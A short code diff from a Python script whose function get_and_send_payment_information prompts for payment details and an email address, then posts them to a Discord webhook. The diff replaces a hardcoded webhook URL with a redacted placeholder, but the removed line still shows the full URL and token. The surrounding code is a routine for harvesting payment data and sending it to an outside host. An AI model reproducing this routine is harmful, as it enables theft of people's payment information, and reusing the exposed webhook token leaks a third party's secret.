@@ -226,7 +226,7 @@ def get_and_send_payment_information():
     payment_method["Your Email Address"] = input("[+] Enter Email Address: ")
 
     # Discord webhook URL
-    webhook_url = "https://discord.com/api/webhooks/1159420148961267752/TnRFmTP_l6IlKEaqG3f-S2UfEM6CkUILsD7R7Wr5zh64O3eNbYiSrQ5bmezzQUqDAjvR"
+    webhook_url = "WEBHOOK-URL->REDACTED"
 
     # Create a DiscordWebhook object
     webhook = DiscordWebhook(url=webhook_url, content=str(payment_method))
